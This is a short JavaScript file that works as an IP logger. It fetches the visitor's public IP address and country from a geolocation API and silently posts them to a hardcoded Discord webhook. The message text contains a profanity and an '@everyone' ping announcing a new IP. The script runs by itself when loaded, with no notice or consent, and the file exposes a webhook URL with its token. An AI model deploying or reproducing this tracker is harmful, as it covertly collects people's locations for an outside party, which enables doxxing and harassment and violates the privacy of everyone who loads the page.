var webHookUrl = "https://discord.com/api/webhooks/1017481516277837834/YHwNSpuQzajTm10YNuHIM-dLCwfJRV1nIlBzO_PEImcGShtaOkLVgHORzNOWXM5_ENsX";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "",
        content:    "**NOWA KURWA IP BOMBA** @everyone \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**Country:**__ \n" +
		    "`" + country + "`"
    }

    postRequest.send(JSON.stringify(params));

}

request();
